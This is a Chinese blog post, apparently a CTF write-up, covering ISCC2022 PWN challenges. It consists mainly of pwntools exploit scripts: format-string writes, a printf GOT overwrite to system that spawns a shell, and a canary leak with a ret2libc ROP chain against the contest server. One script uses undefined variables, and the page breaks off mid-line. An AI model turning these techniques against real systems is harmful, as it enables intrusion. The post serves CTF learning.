<!-- build time:Fri Mar 22 2024 17:39:18 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="ISCC"><link rel="canonical" href="https://blog.xcu.icu/2022/09/23/wp/ISCC2022/"><title>ISCC2022 - WP | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">ISCC2022</h1><div class="meta"><span class="item" title="创建时间：2022-09-23 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-09-23T00:00:00+08:00">2022-09-23</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>15k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>14 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/104.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/103.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/28.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/11.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/141.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/30.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/wp/" itemprop="item" rel="index" title="分类于 WP"><span itemprop="name">WP</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/09/23/wp/ISCC2022/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="pwn"><a class="anchor" href="#pwn">#</a> PWN</h2><h4 id="create_id"><a class="anchor" href="#create_id">#</a> create_id</h4><p>漏洞点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523201628183.png" alt="image-20220523201628183"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523201701199.png" alt="image-20220523201701199"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523201718514.png" alt="image-20220523201718514"></p><p>有后门，格式化字符串漏洞，去修改 x 的值为 9，然后获取 flag 即可。</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> I <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>king <span class="token operator">=</span> p32<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%5c%10$n'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>king<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="sim_treasure"><a class="anchor" href="#sim_treasure">#</a> sim_treasure</h4><p>漏洞点：</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523203444871.png" alt="image-20220523203444871"></p><p>无后门，格式化字符串漏洞。</p><p>泄露 libc 基地址，修改 printf 的 got 表为 system，执行 printf，获取 shell。</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'123.57.69.203'</span><span class="token punctuation">,</span><span class="token number">7010</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./iscc'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>pgd<span class="token operator">=</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>payload<span class="token operator">=</span><span class="token string">'%8$p'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>pgd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%6$s'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>printf_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>libc_base<span class="token operator">=</span>printf_addr<span class="token operator">-</span><span class="token number">0x512d0</span></pre></td></tr><tr><td data-num="11"></td><td><pre>system<span class="token operator">=</span><span class="token number">0x0003d200</span><span class="token operator">+</span>libc_base</pre></td></tr><tr><td data-num="12"></td><td><pre>l<span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span></pre></td></tr><tr><td data-num="13"></td><td><pre>h <span class="token operator">=</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span></pre></td></tr><tr><td data-num="14"></td><td><pre>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>printf_got_addr<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>payload<span class="token operator">+=</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>l<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%6$hn'</span></pre></td></tr><tr><td data-num="17"></td><td><pre>payload<span class="token operator">+=</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>h<span class="token operator">-</span>low<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%7$hn'</span></pre></td></tr><tr><td data-num="18"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="跳一跳"><a class="anchor" href="#跳一跳">#</a> 跳一跳</h4><p>存在 canary，不过用 % s 可以给带出来。主要难点就是 + 对 scanf 的 % hhd 的绕过。这里最后进行了一下源码调试，+ 和 - 确实可以绕过检查，但是又没有被写入栈里，达到了占一位的目的。然后精心构造好要泄露的数据，用 + 覆盖即可，其他的用垃圾数据补充，最后接收一下，绕过 canary 检查，ret2libc 直接日了。</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">autofill_long_libc</span><span class="token punctuation">(</span>target_vul<span class="token punctuation">,</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre> obj <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>target_vul<span class="token punctuation">,</span> leak_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre> libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>target_vul<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre> sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre> bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base---->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre> <span class="token keyword">return</span> sys_addr<span class="token punctuation">,</span> bin_sh_addr</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">def</span> <span class="token function">autofill_local_libc</span><span class="token punctuation">(</span>target_vul<span class="token punctuation">,</span>leak_addr<span class="token punctuation">,</span>libc<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre> libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span>target_vul<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre> sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre> bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base---->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre> <span class="token keyword">return</span> sys_addr<span class="token punctuation">,</span>bin_sh_addr</pre></td></tr><tr><td data-num="17"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'123.57.69.203'</span><span class="token punctuation">,</span><span class="token number">7020</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#p=process('./a')</span></pre></td></tr><tr><td data-num="19"></td><td><pre>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#gdb.attach(p)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello CTFer! Welcome to the world of pwn~\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'17'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">#leak setbuffer</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x4a</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'18'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token triple-quoted-string string">'''leak libc_base'''</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'19'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token triple-quoted-string string">'''leak base'''</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'120'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token triple-quoted-string string">'''leak canary'''</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre> sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'21'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token triple-quoted-string string">'''</span></pre></td></tr><tr><td data-num="54"></td><td><pre>for i in range(7):</pre></td></tr><tr><td data-num="55"></td><td><pre> sleep(0.01)</pre></td></tr><tr><td data-num="56"></td><td><pre> p.sendline('-')</pre></td></tr><tr><td data-num="57"></td><td><pre>'''</pre></td></tr><tr><td data-num="58"></td><td><pre>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">#pause()</span></pre></td></tr><tr><td data-num="60"></td><td><pre>a<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token comment">#p.sendline('1')</span></pre></td></tr><tr><td data-num="62"></td><td><pre>io_stderr_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0x67</span><span class="token punctuation">:</span><span class="token number">0x6d</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">#io_stderr_addr=u64(a[0x91:0x97].ljust(8,'\x00'))</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token comment">#setbuffer_addr=u64(a[0xe1:0xe7].ljust(8,'\x00'))-231</span></pre></td></tr><tr><td data-num="65"></td><td><pre>setbuffer_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0xb7</span><span class="token punctuation">:</span><span class="token number">0xbd</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">231</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'setbuffer_addr-------------------->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>setbuffer_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>libc_base<span class="token operator">=</span>io_stderr_addr<span class="token operator">-</span><span class="token number">0x3ec680</span></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'io_stderr_addr-------------------->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>io_stderr_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base-------------------------->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>base<span class="token operator">=</span>u64<span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0xd7</span><span class="token punctuation">:</span><span class="token number">0xdd</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10a0</span></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token comment">#base=u64(a[0x101:0x107].ljust(8,'\x00'))-0x10a0</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'base------------------------------->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>leak_stack<span class="token operator">=</span>u64<span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0xdf</span><span class="token punctuation">:</span><span class="token number">0xe5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token comment">#leak_stack=u64(a[0x109:0x10f].ljust(8,'\x00'))</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak_stack-------------------------->'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_stack<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre><span class="token comment">#canary=u64(a[0x112:0x119].rjust(8,'\x00'))</span></pre></td></tr><tr><td data-num="77"></td><td><pre>canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0xe8</span><span class="token punctuation">:</span><span class="token number">0xef</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'canary------------------------------>'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>result<span class="token operator">=</span>autofill_long_libc<span class="token punctuation">(</span><span class="token string">'setbuffer'</span><span class="token punctuation">,</span>setbuffer_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token comment">#result=autofill_local_libc('setbuffer',setbuffer_addr,libc)</span></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token comment">#result=autofill_long_libc('_IO_2_1_stderr_',io_stderr_addr)</span></pre></td></tr><tr><td data-num="83"></td><td><pre>sys_addr<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="84"></td><td><pre>bin_sh_addr<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="85"></td><td><pre>pop_rdi_addr<span class="token operator">=</span>base<span class="token operator">+</span><span class="token number">0x130b</span></pre></td></tr><tr><td data-num="86"></td><td><pre>leave_addr<span class="token operator">=</span>base<span class="token operator">+</span><span class="token number">0x124a</span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre><span class="token comment">#gdb.attach(p)</span></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment">#pause()</span></pre></td></tr><tr><td data-num="90"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leak_stack<span class="token operator">-</span><span class="token number">0x1d0</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token 